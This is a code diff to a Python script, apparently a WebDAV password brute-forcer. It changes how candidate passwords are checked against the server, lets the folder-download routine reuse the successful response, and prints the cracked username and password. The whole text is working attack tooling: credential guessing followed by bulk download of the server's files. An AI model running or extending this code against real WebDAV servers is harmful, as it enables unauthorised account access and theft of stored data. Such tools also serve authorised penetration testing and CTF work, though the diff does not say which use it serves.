@@ -23,7 +23,7 @@ import string
 import threading
 import time
 import urllib.parse
-from typing import Iterable, Tuple
+from typing import Iterable, Optional, Tuple
 
 import cbor
 import requests
@@ -163,18 +163,24 @@ def get_dir(path: str) -> str:
     raise Exception(f"Forbidden path: {real}")
 
 
-def download_dir(path: str, password: str) -> None:
+def download_dir(path: str, password: str, response: Optional[requests.Response] = None) -> None:
     "Download a WEBDAV folder"
 
-    # download folder
-    r = dav.get(
-        urllib.parse.urljoin(f"{args.url}/", path),
-        auth=(
-            args.username,
-            password
+    if response is None:
+
+        # download folder
+        r = dav.get(
+            urllib.parse.urljoin(f"{args.url}/", path),
+            auth=(
+                args.username,
+                password
+            )
         )
-    )
-    r.raise_for_status()
+        r.raise_for_status()
+
+    else:
+
+        r = response
 
     # parse 'a' tags from html
     soup = BeautifulSoup(r.text, "html.parser")
@@ -318,12 +324,8 @@ class BruteForce:
 
     def check(self, password: str) -> None:
         # check for rights
-        r = dav.request(
-            "PROPFIND",
+        r = dav.get(
             args.url,
-            headers={
-                "Depth": "1"
-            },
             auth=(
                 args.username,
                 password
@@ -359,14 +361,7 @@ response, password = brute_force.run()
 
 
 # display response
-print("-" * 80)
-print(f"response header: {response.headers}")
-print("-" * 80)
-print(response.text)
-print("-" * 80)
-print(f"status: {response.status_code}")
-print("-" * 80)
-print(f"USER: {args.username}")
+print(f"USERNAME: {args.username}")
 print(f"PASSWORD: {password}")
 
 
